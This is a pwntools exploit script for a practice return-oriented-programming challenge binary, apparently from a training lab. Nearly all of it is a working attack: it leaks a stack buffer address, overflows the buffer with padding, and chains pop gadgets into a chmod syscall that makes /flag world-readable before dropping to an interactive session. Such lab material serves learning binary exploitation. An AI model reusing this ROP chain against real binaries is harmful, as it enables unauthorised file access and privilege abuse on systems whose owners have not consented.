from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Binary filename
exe = '/challenge/babyrop_level4.0'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

p = start()

p.recvuntil(b'input buffer is located at: ')
out = p.recv().split(b'.')
leak = int(out[0],16)
log.info(f'leak buffer : {hex(leak)}')

ke_rip = 136
flag = b'/flag\x00'
offset = len(flag)

print(offset)

ret = p64(0x000000000040101a)
pop_rdi = p64(0x0000000000401ca1)
pop_rsi = p64(0x0000000000401ca9)
pop_rdx = p64(0x0000000000401c91)
pop_rax = p64(0x0000000000401c9a)
syscall = p64(0x0000000000401c89)


payload = flag + b'\x90'*130
payload += pop_rdi
payload += p64(leak)
payload += pop_rsi
payload += p64(0x1ff)
payload += pop_rax
payload += p64(90)
payload += syscall

# Exploit
p.sendline(payload)
# Get flag/shell
log.info('WORRRKKKKKK')
p.interactive()
